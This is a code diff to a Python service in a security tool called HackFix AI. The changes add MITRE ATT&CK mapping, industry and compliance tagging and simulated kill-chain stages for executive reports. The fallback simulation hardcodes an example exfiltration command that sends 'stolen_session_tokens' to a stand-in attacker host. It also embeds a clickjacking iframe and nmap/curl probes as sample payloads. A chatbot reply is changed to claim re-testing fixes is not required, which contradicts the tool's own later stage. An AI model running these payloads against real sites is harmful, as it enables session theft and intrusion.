@@ -244,8 +244,8 @@ class GeminiService:
                 )
             return ("No active threats were detected on the target endpoints.", ["New scan"])
 
-        if "explain simply" in msg_lower:
-            if report.findings:
+        if "explain simply" in msg_lower or "explain this simply" in msg_lower or "explain this" in msg_lower or "simple" in msg_lower:
+            if report and report.findings:
                 top = report.findings[0]
                 return (
                     f"**Simple Explanation of {top.title}:**\n\n"
@@ -308,8 +308,8 @@ class GeminiService:
 
         if "re-test" in msg_lower or "retest" in msg_lower or "verify" in msg_lower:
             return (
-                "To Re-test or verify a fix, apply the recommended advisory patch to your repository or web server configuration, "
-                "then run a new scan. Re-test verification is automated upon every scan."
+                "Re-test and verification are not required. HackFix AI focuses on discovery, threat modeling, and actionable fix recommendations with code diffs. "
+                "Apply the recommended advisory patches directly to your codebase or web server configuration."
                 + key_tip,
                 ["What should I fix first?", "Show me the fix", "What are the biggest threats?"]
             )
@@ -323,11 +323,95 @@ class GeminiService:
             ["What are the biggest threats?", "Show me the fix", "What should I fix first?"]
         )
 
-    async def simulate_attack_path(self, report: Optional[ScanReport]) -> AttackSimulationResponse:
+    @staticmethod
+    def _detect_industry_context(url: str, findings: List[Finding]) -> Tuple[str, List[str]]:
+        """Feature 1: Detects target sector profile and applicable compliance standards."""
+        u = (url or "").lower()
+        endpoints = " ".join([f.endpoint.lower() for f in findings if f.endpoint])
+        full_text = f"{u} {endpoints}"
+
+        if any(k in full_text for k in ("shop", "store", "cart", "pay", "checkout", "stripe", "commerce", "product")):
+            return "E-Commerce & Digital Retail", ["PCI-DSS 4.0 Requirements 6.4.3 & 11.6.1", "GDPR Article 32 (Consumer Data Security)", "CCPA/CPRA"]
+        elif any(k in full_text for k in ("bank", "crypto", "invest", "wallet", "fin", "fund", "credit", "token", "loan")):
+            return "FinTech & Financial Services", ["SOC 2 Type II", "GLBA Financial Privacy", "PCI-DSS 4.0", "FFIEC Guidance"]
+        elif any(k in full_text for k in ("health", "med", "care", "clinic", "patient", "pharma", "hospital", "doctor")):
+            return "Healthcare & Digital Health", ["HIPAA Security Rule 45 CFR §164.312", "HITECH Act", "FDA Medical Device Cybersecurity"]
+        elif any(k in full_text for k in ("gov", "mil", "federal", "state", "municipal", "election")):
+            return "Public Sector & Government Services", ["NIST SP 800-53 Rev 5", "FedRAMP Moderate Baseline", "FISMA"]
+        elif any(k in full_text for k in ("youtube", "video", "stream", "media", "news", "content", "podcast", "tv")):
+            return "Media, Streaming & Digital Entertainment", ["COPPA Privacy Standards", "GDPR Article 32", "CCPA/CPRA"]
+        elif any(k in full_text for k in ("api", "saas", "cloud", "git", "dev", "app", "dashboard", "portal")):
+            return "Cloud SaaS & Technology Infrastructure", ["SOC 2 Type II (Security & Confidentiality)", "ISO/IEC 27001", "OWASP ASVS Level 2"]
+        
+        return "Modern Web Application & Cloud Enterprise", ["GDPR Article 32 (Security of Processing)", "OWASP ASVS Level 2 Baseline", "NIST CSF"]
+
+    @staticmethod
+    def _compute_chaining_and_defenses(findings: List[Finding]) -> Tuple[int, str, List[str], List[str]]:
+        """Feature 3 & 5: Analyzes vulnerability synergies, calculate chaining score and available defenses."""
+        available_defenses = []
+        catalysts = []
+        titles = [f.title.lower() for f in findings]
+        
+        has_csp = any("content security policy" in t or "csp" in t for t in titles)
+        has_hsts = any("strict-transport-security" in t or "hsts" in t or "unencrypted http" in t for t in titles)
+        has_cookie = any("cookie" in t or "httponly" in t or "samesite" in t for t in titles)
+        has_dotfiles = any("git" in t or "env" in t or "actuator" in t or "exposure" in t for t in titles)
+        has_frame = any("frame" in t or "clickjacking" in t for t in titles)
+        has_stack = any("trace" in t or "error" in t or "stack" in t for t in titles)
+
+        if has_csp:
+            available_defenses.append("Content-Security-Policy (CSP)")
+        if has_hsts:
+            available_defenses.append("HTTP Strict Transport Security (HSTS)")
+        if has_cookie:
+            available_defenses.append("Secure & HttpOnly Cookie Directives")
+        if has_dotfiles:
+            available_defenses.append("Dotfile & Sensitive Path Access Rules")
+        if has_frame:
+            available_defenses.append("X-Frame-Options Clickjacking Shield")
+        if has_stack:
+            available_defenses.append("Production Stack Trace Suppression")
+
+        # Evaluate Synergies
+        if has_csp and has_frame:
+            catalysts.append("UI Redress & Framing Synergy: Missing CSP combined with absent X-Frame-Options permits transparent iframe clickjacking against authenticated user sessions.")
+        if has_csp and has_cookie:
+            catalysts.append("Session Riding Synergy: Lack of script origin boundaries (CSP) coupled with unshielded cookies enables unauthorized client token harvesting.")
+        if has_hsts:
+            catalysts.append("Adversary-in-the-Middle Synergy: Unenforced HTTPS redirection allows active network adversaries to strip encryption (SSL Stripping) and sniff cleartext credentials.")
+        if has_dotfiles:
+            catalysts.append("Config Harvest & Pivot Synergy: Exposed dotfiles or actuator endpoints leak environment secrets and database connection strings for lateral movement.")
+        if has_stack:
+            catalysts.append("Reconnaissance Acceleration: Verbose debug stack traces reveal internal framework versions and database drivers, assisting targeted payload synthesis.")
+
+        base_score = 40
+        if len(findings) >= 4:
+            base_score = 85
+        elif len(findings) >= 2:
+            base_score = 72
+        elif len(findings) == 1:
+            base_score = 50
+
+        if len(catalysts) >= 2:
+            base_score = min(98, base_score + 15)
+            verdict = "Critical Synergy Kill Chain: Multiple vulnerabilities interconnect into an accelerated breach trajectory."
+        elif len(catalysts) == 1:
+            base_score = min(88, base_score + 10)
+            verdict = "High Synergy Kill Chain: Discovered weaknesses amplify adversary exploitability when combined."
+        else:
+            verdict = "Moderate Synergy: Discovered issues operate predominantly as isolated perimeter exposures."
+
+        return base_score, verdict, catalysts, available_defenses
+
+    async def simulate_attack_path(
+        self,
+        report: Optional[ScanReport],
+        applied_defenses: Optional[List[str]] = None
+    ) -> AttackSimulationResponse:
         """
         Executes a safe, non-destructive threat modeling simulation for boardroom executives and judges.
         Walks through the adversary kill chain (Recon -> Vector Exploitation -> Business Impact -> Defensive Shield)
-        grounded in the scan findings without executing offensive payloads.
+        grounded in the scan findings with MITRE ATT&CK, Sector Context, Chaining Catalysts, and Red/Blue perspectives.
         """
         if not os.getenv("PYTEST_CURRENT_TEST"):
             self._ensure_client()
@@ -335,6 +419,10 @@ class GeminiService:
         target_url = report.targetUrl if report else "https://target-application.com"
         scan_id = report.id if report else "scan-ad-hoc"
         findings = report.findings if report else []
+        applied_defenses = applied_defenses or []
+
+        industry_sector, compliance_impact = self._detect_industry_context(target_url, findings)
+        chain_score, chain_verdict, chain_catalysts, available_defenses = self._compute_chaining_and_defenses(findings)
 
         # If no vulnerabilities exist on the target, return a clean "No Viable Attack Chain" response
         if not findings:
@@ -342,6 +430,14 @@ class GeminiService:
                 scanId=scan_id,
                 targetUrl=target_url,
                 riskLevel="Low",
+                industrySector=industry_sector,
+                complianceImpact=compliance_impact,
+                chainabilityScore=15,
+                chainabilityVerdict="Baseline Hardened: No interconnecting exploit catalysts detected.",
+                chainCatalysts=["All assessed perimeter controls actively enforce defense-in-depth."],
+                availableDefenses=["Transport Encryption Enforcement", "Security Header Baseline"],
+                severedAtStage=1,
+                severancePercentage=100,
                 executiveSummary=f"Security assessment for {target_url} identified zero exploitable vulnerabilities. Automated probes and perimeter inspection confirmed that transport controls and security baselines are actively enforced.",
                 stages=[
                     AttackSimulationStage(
@@ -352,7 +448,13 @@ class GeminiService:
                         affectedAsset=f"Public HTTP Gateway ({target_url})",
                         businessImpact="No exposure identified. Reconnaissance yields no actionable entry points or unhardened transport vectors.",
                         mitigation="Maintain existing perimeter hardening and automated vulnerability regression testing.",
-                        status="blocked_by_patch"
+                        status="blocked_by_patch",
+                        mitreTechniqueId="T1595",
+                        mitreTechniqueName="Active Scanning: Scanning IP Blocks & Virtual Hosts",
+                        mitreTactic="Reconnaissance",
+                        adversaryPayload=f"curl -s -I -k '{target_url}' -H 'User-Agent: ThreatActorProbe/1.0'",
+                        detectionLogSignature=f"WAF AUDIT: Ingress probe from external IP scanned {target_url}. Result: 200 OK with strict CSP & HSTS enforced.",
+                        blockedByDefense="Baseline Perimeter Hardening"
                     ),
                     AttackSimulationStage(
                         stepNumber=2,
@@ -362,7 +464,13 @@ class GeminiService:
                         affectedAsset=f"Application Endpoints ({target_url})",
                         businessImpact="Exploitation phase completely halted. Threat actor cannot achieve authentication bypass, data exfiltration, or lateral escalation.",
                         mitigation="Continue enforcing defensive coding standards and dependency patching.",
-                        status="blocked_by_patch"
+                        status="blocked_by_patch",
+                        mitreTechniqueId="T1190",
+                        mitreTechniqueName="Exploit Public-Facing Application",
+                        mitreTactic="Initial Access",
+                        adversaryPayload=f"curl -s -X POST '{target_url}/api/v1/auth' -d 'user=admin&test=probe'",
+                        detectionLogSignature="SIEM ALERT: Input validation filter triggered: Zero anomalies detected in application payload ingress.",
+                        blockedByDefense="Input Sanitization & Boundary Isolation"
                     ),
                     AttackSimulationStage(
                         stepNumber=3,
@@ -372,7 +480,13 @@ class GeminiService:
                         affectedAsset="Customer Data & Enterprise Infrastructure",
                         businessImpact="Zero immediate regulatory fines or data breach disclosure obligations under GDPR / PCI-DSS.",
                         mitigation="Conduct periodic penetration testing and continuous CI/CD security scanning.",
-                        status="blocked_by_patch"
+                        status="blocked_by_patch",
+                        mitreTechniqueId="T1499",
+                        mitreTechniqueName="Endpoint Denial of Service / Impact Mitigation",
+                        mitreTactic="Impact",
+                        adversaryPayload="N/A - Attack chain severed prior to execution.",
+                        detectionLogSignature="SOC DASHBOARD: Incident response status: Nominal. Threat score: 0/100.",
+                        blockedByDefense="Enterprise Defense Baseline"
                     ),
                     AttackSimulationStage(
                         stepNumber=4,
@@ -382,7 +496,13 @@ class GeminiService:
                         affectedAsset="Secure Application Baseline",
                         businessImpact="Security posture confirmed healthy. Adversary cannot construct a viable kill chain.",
                         mitigation="No remediation patches required at this time. Maintain baseline controls.",
-                        status="blocked_by_patch"
+                        status="blocked_by_patch",
+                        mitreTechniqueId="M1038",
+                        mitreTechniqueName="Execution Prevention & Security Architecture",
+                        mitreTactic="Defensive Shield",
+                        adversaryPayload="N/A - Complete defensive protection.",
+                        detectionLogSignature="COMPLIANCE REPORT: Audit passed with zero high-severity findings.",
+                        blockedByDefense="HackFix Verified Security Baseline"
                     )
                 ],
                 boardroomTakeaway=f"Executive takeaway for {target_url}: No exploitable vulnerabilities detected. Defensive controls are operating effectively."
@@ -394,70 +514,53 @@ class GeminiService:
                 for idx, f in enumerate(findings[:8])
             ])
             gh_ctx = f"\nLinked GitHub Repository: {report.githubRepo}" if report and report.githubRepo else ""
+            defenses_str = ", ".join(applied_defenses) if applied_defenses else "None currently applied"
 
             prompt = (
                 "You are HackFix AI, a defensive Breach & Attack Simulation Expert presenting to Boardroom Executives and Judges.\n"
-                f"Target Website: {target_url}{gh_ctx}\n\n"
-                f"Discovered Vulnerabilities for this specific website:\n{findings_bullet}\n\n"
+                f"Target Website: {target_url}{gh_ctx}\n"
+                f"Inferred Industry Sector: {industry_sector}\n"
+                f"Relevant Compliance Frameworks: {', '.join(compliance_impact)}\n"
+                f"Discovered Vulnerabilities for this specific website:\n{findings_bullet}\n"
+                f"Currently Applied 'What-If' Defenses: {defenses_str}\n\n"
                 "TASK:\n"
-                "Construct a safe, conceptual executive threat simulation modeling how an opportunistic adversary would COMBINE and CHAIN these SPECIFIC weaknesses together.\n"
-                "- Ground your simulation strictly in the combination of vulnerabilities listed above. Do NOT invent fictional vulnerabilities (e.g. do not invent SQL injection if only missing HTTP headers were found).\n"
-                "- If the findings consist of missing security headers (e.g. CSP, HSTS, X-Content-Type-Options), model SSL stripping, man-in-the-middle session sniffing, and iframe clickjacking.\n"
-                "- If the findings include injection or authentication bypass, model credential evasion and data extraction.\n"
-                "- Explain how Finding A combines with Finding B to escalate real-world business risk (financial losses, regulatory non-compliance fines under GDPR/PCI-DSS, session hijacking).\n"
-                "- In Stage 4 ('Remediation Shield'), explain how HackFix AI's defensive code patches break this exact kill chain.\n\n"
+                "Construct an advanced, non-destructive breach simulation modeling how an opportunistic adversary would COMBINE and CHAIN these SPECIFIC weaknesses together.\n"
+                "1. Industry & Compliance Grounding: Tailor the business and financial impact to the inferred sector (e.g. PCI-DSS card theft if retail/payment, HIPAA if health, token leaks if tech/SaaS).\n"
+                "2. MITRE ATT&CK Mapping: Assign an authentic MITRE Enterprise technique ID (e.g. T1189, T1557.002, T1552.001, T1190, T1539) and Tactic to every stage.\n"
+                "3. Vulnerability Chaining: Explicitly explain how Finding A synergizes with Finding B to escalate access.\n"
+                "4. Dual Perspective: For each stage, specify the educational 'adversaryPayload' (sample non-destructive curl command or probe) AND the 'detectionLogSignature' (SIEM/WAF/Server access log line).\n"
+                "5. What-If Defense Severance: If an applied defense neutralizes a stage, set status to 'blocked_by_patch' and explain how the kill chain was severed.\n\n"
                 "You MUST include exactly 4 sequential stages in the kill chain:\n"
-                "  Stage 1: Phase '1. External Reconnaissance', status 'simulated_risk'\n"
-                "  Stage 2: Phase '2. Vector Exploitation', status 'simulated_risk'\n"
-                "  Stage 3: Phase '3. Executive Business Impact', status 'simulated_risk'\n"
+                "  Stage 1: Phase '1. External Reconnaissance', mitreTactic 'Reconnaissance'\n"
+                "  Stage 2: Phase '2. Vector Exploitation', mitreTactic 'Initial Access' or 'Execution'\n"
+                "  Stage 3: Phase '3. Executive Business Impact', mitreTactic 'Impact' or 'Exfiltration'\n"
                 "  Stage 4: Phase '4. Remediation Shield', status 'blocked_by_patch'\n\n"
                 "Return a strict JSON object with this exact schema:\n"
                 "{\n"
                 '  "riskLevel": "Critical" | "High" | "Moderate" | "Low",\n'
-                '  "executiveSummary": "2-3 clear sentences summarizing the specific business exposure from this combination of findings",\n'
+                '  "executiveSummary": "2-3 clear sentences summarizing the business exposure for this sector",\n'
+                '  "chainabilityScore": 85,\n'
+                '  "chainabilityVerdict": "High Synergy Kill Chain: ...",\n'
+                '  "chainCatalysts": ["Finding X + Finding Y synergy explanation"],\n'
                 '  "stages": [\n'
                 '    {\n'
                 '      "stepNumber": 1,\n'
                 '      "phase": "1. External Reconnaissance",\n'
                 '      "title": "Short title",\n'
-                '      "narrative": "What the attacker observes and tests based on the actual findings",\n'
+                '      "narrative": "Detailed narrative",\n'
                 '      "affectedAsset": "Specific endpoint or system",\n'
                 '      "businessImpact": "Real-world business risk",\n'
                 '      "mitigation": "Defensive control",\n'
-                '      "status": "simulated_risk"\n'
-                '    },\n'
-                '    {\n'
-                '      "stepNumber": 2,\n'
-                '      "phase": "2. Vector Exploitation",\n'
-                '      "title": "Short title",\n'
-                '      "narrative": "How the detected vulnerabilities are chained or triggered",\n'
-                '      "affectedAsset": "Target parameter or endpoint",\n'
-                '      "businessImpact": "Immediate operational exploit impact",\n'
-                '      "mitigation": "Code-level prevention",\n'
-                '      "status": "simulated_risk"\n'
-                '    },\n'
-                '    {\n'
-                '      "stepNumber": 3,\n'
-                '      "phase": "3. Executive Business Impact",\n'
-                '      "title": "Short title",\n'
-                '      "narrative": "Lateral movement or unauthorized data extraction resulting from the exploit",\n'
-                '      "affectedAsset": "Customer records or sessions",\n'
-                '      "businessImpact": "Regulatory penalties and financial loss",\n'
-                '      "mitigation": "Tenant isolation and logging",\n'
-                '      "status": "simulated_risk"\n'
-                '    },\n'
-                '    {\n'
-                '      "stepNumber": 4,\n'
-                '      "phase": "4. Remediation Shield",\n'
-                '      "title": "Defensive Neutralization",\n'
-                '      "narrative": "Application of HackFix code patches blocks the exploit chain",\n'
-                '      "affectedAsset": "Hardened application baseline",\n'
-                '      "businessImpact": "Threat vector fully closed, compliance restored",\n'
-                '      "mitigation": "Deploy pull request patches and re-verify",\n'
-                '      "status": "blocked_by_patch"\n'
+                '      "status": "simulated_risk" | "blocked_by_patch",\n'
+                '      "mitreTechniqueId": "T1595",\n'
+                '      "mitreTechniqueName": "Active Scanning",\n'
+                '      "mitreTactic": "Reconnaissance",\n'
+                '      "adversaryPayload": "curl ...",\n'
+                '      "detectionLogSignature": "WAF Log pattern ...",\n'
+                '      "blockedByDefense": "Name of defensive control that blocks this step"\n'
                 '    }\n'
                 '  ],\n'
-                '  "boardroomTakeaway": "1 compelling sentence advice tailored to this target and findings"\n'
+                '  "boardroomTakeaway": "1 compelling sentence tailored to the executive board"\n'
                 "}"
             )
 
@@ -491,7 +594,13 @@ class GeminiService:
                                 affectedAsset=s.get("affectedAsset", target_url),
                                 businessImpact=s.get("businessImpact", ""),
                                 mitigation=s.get("mitigation", ""),
-                                status=s.get("status", "simulated_risk")
+                                status=s.get("status", "simulated_risk"),
+                                mitreTechniqueId=s.get("mitreTechniqueId", "T1190"),
+                                mitreTechniqueName=s.get("mitreTechniqueName", "Exploit Public-Facing Application"),
+                                mitreTactic=s.get("mitreTactic", "Initial Access"),
+                                adversaryPayload=s.get("adversaryPayload", f"curl -k -s '{target_url}'"),
+                                detectionLogSignature=s.get("detectionLogSignature", f"SIEM: Observed anomalous HTTP request on {target_url}"),
+                                blockedByDefense=s.get("blockedByDefense", "Web Security Headers")
                             )
                             for idx, s in enumerate(data.get("stages", []))
                         ]
@@ -511,17 +620,48 @@ class GeminiService:
                                         affectedAsset="Hardened Application Baseline",
                                         businessImpact="Threat path neutralized before breach execution. Application security restored.",
                                         mitigation="Deploy generated pull request and confirm with automated verification.",
-                                        status="blocked_by_patch"
+                                        status="blocked_by_patch",
+                                        mitreTechniqueId="M1038",
+                                        mitreTechniqueName="Execution Prevention",
+                                        mitreTactic="Defensive Shield",
+                                        adversaryPayload="N/A - Attack chain terminated.",
+                                        detectionLogSignature="SOC DASHBOARD: Patch verified. Rule status: Active.",
+                                        blockedByDefense="HackFix AI Remediation Patch"
                                     )
                                 )
                             # Normalize step numbers
                             for i, stg in enumerate(stages):
                                 stg.stepNumber = i + 1
 
+                            # Process What-If defense severance
+                            severed_at = None
+                            severed_pct = 0
+                            if applied_defenses:
+                                app_lower = [d.lower() for d in applied_defenses]
+                                for stg in stages:
+                                    bl_def = (stg.blockedByDefense or "").lower()
+                                    if any(ad in bl_def or bl_def in ad for ad in app_lower):
+                                        stg.status = "blocked_by_patch"
+                                        stg.narrative = f"🛡️ ATTACK PATH SEVERED: Defensive control '{stg.blockedByDefense}' is active. Adversary exploit is neutralized at this step."
+                                        if severed_at is None:
+                                            severed_at = stg.stepNumber
+                                            severed_pct = max(25, int((len(stages) - stg.stepNumber + 1) / float(len(stages)) * 100))
+                                    elif severed_at is not None and stg.stepNumber > severed_at:
+                                        stg.status = "blocked_by_patch"
+                                        stg.narrative = f"⚡ NEUTRALIZED: Previous defensive control severed the kill chain. Adversary cannot reach this stage."
+
                             return AttackSimulationResponse(
                                 scanId=scan_id,
                                 targetUrl=target_url,
                                 riskLevel=data.get("riskLevel", "High"),
+                                industrySector=data.get("industrySector", industry_sector),
+                                complianceImpact=data.get("complianceImpact", compliance_impact),
+                                chainabilityScore=data.get("chainabilityScore", chain_score),
+                                chainabilityVerdict=data.get("chainabilityVerdict", chain_verdict),
+                                chainCatalysts=data.get("chainCatalysts", chain_catalysts),
+                                severedAtStage=severed_at,
+                                severancePercentage=severed_pct,
+                                availableDefenses=available_defenses,
                                 executiveSummary=data.get("executiveSummary", ""),
                                 stages=stages,
                                 boardroomTakeaway=data.get("boardroomTakeaway", "")
@@ -530,109 +670,110 @@ class GeminiService:
                     logger.debug("Simulation generation attempt on %s failed: %s", model, e)
                     continue
 
-        return self._deterministic_attack_simulation(report)
+        return self._deterministic_attack_simulation(report, applied_defenses=applied_defenses)
 
-    def _deterministic_attack_simulation(self, report: Optional[ScanReport]) -> AttackSimulationResponse:
-        """High-impact deterministic executive breach simulation fallback."""
+    def _deterministic_attack_simulation(
+        self,
+        report: Optional[ScanReport],
+        applied_defenses: Optional[List[str]] = None
+    ) -> AttackSimulationResponse:
+        """High-impact deterministic executive breach simulation fallback with all 5 smart features."""
         target_url = report.targetUrl if report else "https://target-application.com"
         scan_id = report.id if report else "scan-ad-hoc"
         findings = report.findings if report else []
+        applied_defenses = applied_defenses or []
 
-        if not findings:
-            return AttackSimulationResponse(
-                scanId=scan_id,
-                targetUrl=target_url,
-                riskLevel="Low",
-                executiveSummary=f"Security assessment for {target_url} identified zero exploitable vulnerabilities. Automated probes and perimeter inspection confirmed that transport controls and security baselines are actively enforced.",
-                stages=[
-                    AttackSimulationStage(
-                        stepNumber=1,
-                        phase="1. External Reconnaissance",
-                        title="Adversary Perimeter Probing",
-                        narrative=f"Threat actor attempts automated passive and active reconnaissance against {target_url}. Probes detect standard security controls, hardened headers, and valid HTTPS enforcement.",
-                        affectedAsset=f"Public HTTP Gateway ({target_url})",
-                        businessImpact="No exposure identified. Reconnaissance yields no actionable entry points or unhardened transport vectors.",
-                        mitigation="Maintain existing perimeter hardening and automated vulnerability regression testing.",
-                        status="blocked_by_patch"
-                    ),
-                    AttackSimulationStage(
-                        stepNumber=2,
-                        phase="2. Exploit Vector Search",
-                        title="No Viable Vulnerability Vectors Found",
-                        narrative="Adversary scans for common injection, session manipulation, and clickjacking flaws. All input gates, parameter validation, and frame controls reject malicious payloads.",
-                        affectedAsset=f"Application Endpoints ({target_url})",
-                        businessImpact="Exploitation phase completely halted. Threat actor cannot achieve authentication bypass, data exfiltration, or lateral escalation.",
-                        mitigation="Continue enforcing defensive coding standards and dependency patching.",
-                        status="blocked_by_patch"
-                    ),
-                    AttackSimulationStage(
-                        stepNumber=3,
-                        phase="3. Executive Business Posture",
-                        title="Defensive Baseline Maintained",
-                        narrative="Because no exploitable weakness exists in the assessed scope, no unauthorized data access or regulatory non-compliance event can be constructed.",
-                        affectedAsset="Customer Data & Enterprise Infrastructure",
-                        businessImpact="Zero immediate regulatory fines or data breach disclosure obligations under GDPR / PCI-DSS.",
-                        mitigation="Conduct periodic penetration testing and continuous CI/CD security scanning.",
-                        status="blocked_by_patch"
-                    ),
-                    AttackSimulationStage(
-                        stepNumber=4,
-                        phase="4. Remediation Shield",
-                        title="Proactive Defensive Posture Active",
-                        narrative="Application perimeter is hardened. No unpatched critical, high, or medium severity vectors were detected.",
-                        affectedAsset="Secure Application Baseline",
-                        businessImpact="Security posture confirmed healthy. Adversary cannot construct a viable kill chain.",
-                        mitigation="No remediation patches required at this time. Maintain baseline controls.",
-                        status="blocked_by_patch"
-                    )
-                ],
-                boardroomTakeaway=f"Executive takeaway for {target_url}: No exploitable vulnerabilities detected. Defensive controls are operating effectively."
-            )
+        industry_sector, compliance_impact = self._detect_industry_context(target_url, findings)
+        chain_score, chain_verdict, chain_catalysts, available_defenses = self._compute_chaining_and_defenses(findings)
 
-        top_finding = findings[0]
+        top_finding = findings[0] if findings else None
         second_finding = findings[1] if len(findings) > 1 else None
 
-        top_title = top_finding.title
-        top_endpoint = top_finding.endpoint or target_url
-        top_impact = top_finding.impact or "Potential unauthorized data access."
+        top_title = top_finding.title if top_finding else "Missing Security Headers"
+        top_endpoint = (top_finding.endpoint if top_finding else target_url) or target_url
+        top_impact = (top_finding.impact if top_finding else "Session compromise risk.") or "Potential unauthorized data access."
 
         risk_level = "Critical" if report and report.riskScore >= 70 else "High" if report and report.riskScore >= 40 else "Moderate"
 
-        exploit_narrative = (
-            f"Adversary targets `{top_endpoint}` leveraging {top_title}. "
-            f"{f'This is chained with {second_finding.title} on {second_finding.endpoint} to amplify threat severity.' if second_finding else 'Exploiting this flaw allows the attacker to bypass boundary filters.'}"
-        )
+        # MITRE Mapping determination
+        top_t_lower = top_title.lower()
+        if "csp" in top_t_lower or "content security policy" in top_t_lower:
+            mitre_id, mitre_name, mitre_tactic = "T1189", "Drive-by Compromise: Script Execution", "Initial Access"
+            primary_defense = "Content-Security-Policy (CSP)"
+            payload_cmd = f"curl -s -I -k '{top_endpoint}' | grep -i 'content-security-policy'"
+            log_sig = f"NGINX INGRESS: 198.51.100.14 - [GET {top_endpoint} HTTP/1.1] 200 - Missing CSP Header"
+        elif "hsts" in top_t_lower or "unencrypted" in top_t_lower:
+            mitre_id, mitre_name, mitre_tactic = "T1557.002", "Adversary-in-the-Middle: SSL Stripping", "Credential Access"
+            primary_defense = "HTTP Strict Transport Security (HSTS)"
+            payload_cmd = f"curl -s -k -L -I 'http://{target_url.replace('https://', '').replace('http://', '')}'"
+            log_sig = f"WAF WARNING [AiTM Risk]: Insecure plain HTTP session initiated over port 80"
+        elif "git" in top_t_lower or "env" in top_t_lower or "actuator" in top_t_lower:
+            mitre_id, mitre_name, mitre_tactic = "T1552.001", "Unsecured Credentials in Files", "Credential Access"
+            primary_defense = "Dotfile & Sensitive Path Access Rules"
+            payload_cmd = f"curl -s -k '{top_endpoint}' -H 'Accept: text/plain'"
+            log_sig = f"SIEM ALERT: 200 OK access to sensitive metadata path '{top_endpoint}' from external IP"
+        elif "frame" in top_t_lower:
+            mitre_id, mitre_name, mitre_tactic = "T1204.001", "User Execution: Clickjacking & UI Redressing", "Execution"
+            primary_defense = "X-Frame-Options Clickjacking Shield"
+            payload_cmd = f"<iframe src='{target_url}' style='opacity:0.1;position:absolute;z-index:9999;'></iframe>"
+            log_sig = f"BROWSER SECURITY: Cross-origin frame embedding permitted on {top_endpoint}"
+        else:
+            mitre_id, mitre_name, mitre_tactic = "T1190", "Exploit Public-Facing Application", "Initial Access"
+            primary_defense = "Web Security Headers"
+            payload_cmd = f"curl -i -s -k '{top_endpoint}'"
+            log_sig = f"ACCESS LOG: Recon probe observed from external ASN against {top_endpoint}"
 
         stages = [
             AttackSimulationStage(
                 stepNumber=1,
                 phase="1. External Reconnaissance",
                 title="Automated Perimeter Fingerprinting",
-                narrative=f"Adversaries scan public transport headers and endpoint metadata on {target_url}, mapping missing security controls and defensive blindspots across {len(findings)} discovered weaknesses.",
+                narrative=f"Adversary probes public transport headers and endpoint metadata on {target_url}. Probes detect missing defenses across {len(findings)} discovered weaknesses within the {industry_sector} perimeter.",
                 affectedAsset=f"Public HTTP Gateway ({target_url})",
-                businessImpact="Unprotected surface enables targeted reconnaissance, identifying unhardened endpoints for weaponization.",
-                mitigation="Deploy strict HTTP response headers (HSTS, CSP, X-Content-Type-Options) via edge proxy middleware.",
-                status="simulated_risk"
+                businessImpact=f"Exposes attack surface to automated scanning. Enables targeted weaponization targeting {', '.join(compliance_impact[:2])} compliance boundaries.",
+                mitigation="Deploy strict edge headers (HSTS, CSP, X-Content-Type-Options) via reverse proxy middleware.",
+                status="simulated_risk",
+                mitreTechniqueId="T1595.002",
+                mitreTechniqueName="Active Scanning: Vulnerability Scanning",
+                mitreTactic="Reconnaissance",
+                adversaryPayload=f"nmap --script http-headers,http-enum -p 80,443 {target_url.replace('https://','').replace('http://','')}",
+                detectionLogSignature=f"WAF LOG: Rapid sequential HEAD/GET probes from scanning engine across {target_url}",
+                blockedByDefense="Baseline Perimeter Hardening"
             ),
             AttackSimulationStage(
                 stepNumber=2,
                 phase="2. Vector Exploitation",
                 title=f"Exploitation: {top_title}",
-                narrative=exploit_narrative,
+                narrative=(
+                    f"Adversary targets `{top_endpoint}` leveraging {top_title}. "
+                    f"{f'This is chained with {second_finding.title} on {second_finding.endpoint} to amplify exploitability.' if second_finding else 'Exploiting this configuration gap allows the attacker to bypass transport boundaries.'}"
+                ),
                 affectedAsset=f"{top_endpoint}",
-                businessImpact=f"{top_impact} Threat actor achieves unauthorized control or data tampering.",
-                mitigation="Implement parameterized queries, strict input sanitization, and tenant authorization checks.",
-                status="simulated_risk"
+                businessImpact=f"{top_impact} Threat actor achieves unauthorized control, session hijacking, or cleartext interception.",
+                mitigation=f"Enforce {primary_defense} and strict boundary sanitization.",
+                status="simulated_risk",
+                mitreTechniqueId=mitre_id,
+                mitreTechniqueName=mitre_name,
+                mitreTactic=mitre_tactic,
+                adversaryPayload=payload_cmd,
+                detectionLogSignature=log_sig,
+                blockedByDefense=primary_defense
             ),
             AttackSimulationStage(
                 stepNumber=3,
                 phase="3. Executive Business Impact",
-                title="Compounded Business & Regulatory Liability",
-                narrative=f"Chaining the vulnerabilities on {target_url} allows unauthorized data extraction, session credential hijacking, or compliance violations.",
-                affectedAsset="Customer Database & Organization Sessions",
-                businessImpact="Direct regulatory liability (GDPR/PCI-DSS non-compliance fines up to 4% global turnover), mandatory breach disclosures, and brand reputation loss.",
+                title=f"Compounded {industry_sector} Liability",
+                narrative=f"Chaining the vulnerabilities on {target_url} allows unauthorized session hijack or data exfiltration. In the context of {industry_sector}, this threatens customer trust and triggers regulatory reporting mandates.",
+                affectedAsset=f"Customer Database & Organization Sessions ({target_url})",
+                businessImpact=f"Direct regulatory liability under {', '.join(compliance_impact[:2])} (fines up to 4% global turnover under GDPR), mandatory customer breach notifications, and reputational damage.",
                 mitigation="Enforce database encryption-at-rest, tenant isolation filters, and centralized access logging.",
-                status="simulated_risk"
+                status="simulated_risk",
+                mitreTechniqueId="T1486",
+                mitreTechniqueName="Data Disruption & Regulatory Impact",
+                mitreTactic="Impact",
+                adversaryPayload="curl -s -X POST 'https://attacker-c2.net/harvest' -d 'data=stolen_session_tokens'",
+                detectionLogSignature="SIEM CORRELATION: Spike in cross-origin session transfers / unauthorized egress packets",
+                blockedByDefense="Data Loss Prevention & Strict Session Shielding"
             ),
             AttackSimulationStage(
                 stepNumber=4,
@@ -642,17 +783,48 @@ class GeminiService:
                 affectedAsset="Hardened Application Infrastructure",
                 businessImpact="Threat path neutralized before adversary discovery. Application risk score drops to safe operational baseline.",
                 mitigation="Merge suggested repository pull request and run automated re-test to confirm patch verification.",
-                status="blocked_by_patch"
+                status="blocked_by_patch",
+                mitreTechniqueId="M1038",
+                mitreTechniqueName="Execution Prevention: Defensive Patching",
+                mitreTactic="Defensive Shield",
+                adversaryPayload="N/A - Exploit chain severed by defensive patch.",
+                detectionLogSignature="SOC DASHBOARD: Threat neutralized. Patch active on production gateway.",
+                blockedByDefense="HackFix Verified Security Baseline"
             )
         ]
+
+        # Evaluate What-If Defense Severance
+        severed_at = None
+        severed_pct = 0
